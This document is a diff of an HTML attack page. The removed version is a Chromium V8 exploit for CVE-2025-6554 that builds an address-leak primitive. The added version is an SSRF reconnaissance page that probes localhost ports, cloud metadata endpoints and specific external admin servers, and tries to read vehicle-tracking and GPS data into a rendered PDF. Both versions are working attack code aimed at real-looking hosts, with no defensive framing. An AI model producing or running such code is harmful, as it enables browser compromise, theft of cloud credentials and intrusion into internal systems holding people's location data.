@@ -1,1 +1,111 @@
-<!doctype html><meta charset=utf-8><title>CASI V70 CVE-2025-6554 CORRECTED ADDROF</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V70 CHROMIUM 133 CVE-2025-6554 CORRECTED ADDROF</b><pre id=o>START</pre><script>var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}function hax(t){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=t?hole:"not the hole";let len=o.maybe_hole.length,sign=Math.sign(len),i1=2-(sign+1),i2=5-(i1+4)>>1,i3=2*i2+2,i4=i3>>1,i5=i4*1000;let a=new Array(8);a[0]=13.37;a[i5]=13.37;return a}try{let normal=hax(false);for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);let c=hax(true);let fa=[1111.1111,2222.2222,3333.3333];let oa={p:"AAAA"},ob={p:"BBBB"},objs=[oa,ob];let rw=[4444.4444,5555.5555,6666.6666,7777.7777];let tail=[8888.8888,9999.9999];let orig=c[30],old=ftoi(orig),doubleMap=0x1540d9n;c[30]=setbits(old&0xffffffffn,doubleMap);let leak=objs[0];c[30]=orig;out.textContent=["DONE","length="+c.length,"slot30=0x"+old.toString(16),"double_map=0x"+doubleMap.toString(16),"leak_type="+typeof leak,"leak_bits=0x"+(typeof leak==="number"?ftoi(leak).toString(16):"none"),"restored=0x"+ftoi(c[30]).toString(16)].join("\n")}catch(e){out.textContent="THREW\n"+e.name+"\n"+e.message}</script>
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>SSRF Internal Recon</title>
+<style>body{font:11px monospace;margin:4px}pre{white-space:pre-wrap}iframe{width:100%;height:200px;border:1px solid #999}</style>
+</head><body>
+<pre id="o">Loading...</pre>
+
+<h3>Internal Service Iframes (content captured in PDF)</h3>
+
+<p>1. Localhost authenticated endpoint - /ax/veh/list.php:</p>
+<iframe src="https://127.0.0.1/ax/veh/list.php?node=3"></iframe>
+
+<p>2. Localhost - /ax/reports_csv.php:</p>
+<iframe src="https://127.0.0.1/ax/reports_csv.php?node=3&veh_id=1&start_date=2026-01-01&stop_date=2026-01-02&report_type=1&tz=GMT&locale=en_US.UTF8"></iframe>
+
+<p>3. Admin server (41.71.64.235) - init.php:</p>
+<iframe src="https://41.71.64.235/backend/ax/init.php?node=3"></iframe>
+
+<p>4. Admin server - /ax/veh/list.php:</p>
+<iframe src="https://41.71.64.235/ax/veh/list.php?node=3"></iframe>
+
+<p>5. Localhost port 8080:</p>
+<iframe src="http://127.0.0.1:8080/"></iframe>
+
+<p>6. Localhost port 3000:</p>
+<iframe src="http://127.0.0.1:3000/"></iframe>
+
+<p>7. Localhost - phpinfo:</p>
+<iframe src="https://127.0.0.1/info.php"></iframe>
+
+<p>8. Localhost - /server-status (Apache):</p>
+<iframe src="https://127.0.0.1/server-status"></iframe>
+
+<p>9. Internal - /backend/ax/init.php via localhost:</p>
+<iframe src="https://127.0.0.1/backend/ax/init.php?node=3"></iframe>
+
+<p>10. Vendor server config:</p>
+<iframe src="https://41.71.64.234/backend/ax/init.php?node=3"></iframe>
+
+<script>
+var O=document.getElementById('o');O.textContent='';
+function L(m){O.textContent+=m+'\n'}
+
+L('=== SSRF Internal Network Recon ===');
+L('Time: '+new Date().toISOString());
+L('UA: '+navigator.userAgent);
+L('');
+
+var targets=[
+    {url:'https://127.0.0.1/ax/veh/list.php?node=3',name:'localhost veh/list'},
+    {url:'https://127.0.0.1/backend/ax/init.php?node=3',name:'localhost init.php'},
+    {url:'https://127.0.0.1/ax/get_gpx_file.php?track_id=1&node=3',name:'localhost GPS track 1'},
+    {url:'https://41.71.64.235/backend/ax/init.php?node=3',name:'admin server init'},
+    {url:'https://41.71.64.235/ax/veh/list.php?node=3',name:'admin veh/list'},
+    {url:'https://41.71.64.234/backend/ax/init.php?node=3',name:'vendor init'},
+    {url:'http://127.0.0.1:8080/',name:'localhost:8080'},
+    {url:'http://127.0.0.1:3000/',name:'localhost:3000'},
+    {url:'http://127.0.0.1:9200/',name:'localhost:9200 (elastic)'},
+    {url:'http://127.0.0.1:6379/',name:'localhost:6379 (redis)'},
+    {url:'http://169.254.169.254/latest/meta-data/',name:'AWS metadata'},
+    {url:'http://169.254.169.254/computeMetadata/v1/',name:'GCP metadata'},
+    {url:'https://127.0.0.1/server-status',name:'Apache status'},
+    {url:'https://127.0.0.1/nginx_status',name:'Nginx status'},
+    {url:'https://127.0.0.1/info.php',name:'phpinfo'},
+    {url:'http://127.0.0.1:5432/',name:'localhost:5432 (postgres)'},
+    {url:'http://127.0.0.1:27017/',name:'localhost:27017 (mongo)'},
+    {url:'https://41.71.64.233/backend/ax/init.php?node=3',name:'.233 init'},
+    {url:'https://41.71.64.237/backend/ax/init.php?node=3',name:'.237 init'},
+    {url:'https://41.71.64.238/',name:'.238 root'},
+];
+
+var done=0;
+function probe(t){
+    var start=performance.now();
+    fetch(t.url,{mode:'no-cors',redirect:'follow'}).then(function(r){
+        var ms=(performance.now()-start).toFixed(0);
+        L('[OPEN] '+t.name+' status='+r.status+' type='+r.type+' ('+ms+'ms)');
+        done++;if(done>=targets.length)L('\nScan complete: '+done+'/'+targets.length);
+    }).catch(function(e){
+        var ms=(performance.now()-start).toFixed(0);
+        L('[FAIL] '+t.name+' err='+e.message+' ('+ms+'ms)');
+        done++;if(done>=targets.length)L('\nScan complete: '+done+'/'+targets.length);
+    });
+}
+
+L('Probing '+targets.length+' targets...');
+L('');
+for(var i=0;i<targets.length;i++){
+    probe(targets[i]);
+}
+
+setTimeout(function(){
+    L('\n=== Attempting CORS fetch for readable data ===');
+    var readable=[
+        {url:'https://127.0.0.1/backend/ax/init.php?node=3',name:'localhost init.php'},
+        {url:'https://127.0.0.1/ax/get_gpx_file.php?track_id=1&node=3',name:'localhost GPS'},
+        {url:'https://41.71.64.235/backend/ax/init.php?node=3',name:'admin init'},
+    ];
+    for(var i=0;i<readable.length;i++){
+        (function(t){
+            fetch(t.url).then(function(r){
+                return r.text();
+            }).then(function(text){
+                L('[READ] '+t.name+': '+text.substring(0,500));
+            }).catch(function(e){
+                L('[CORS] '+t.name+': '+e.message);
+            });
+        })(readable[i]);
+    }
+},5000);
+</script>
+</body></html>
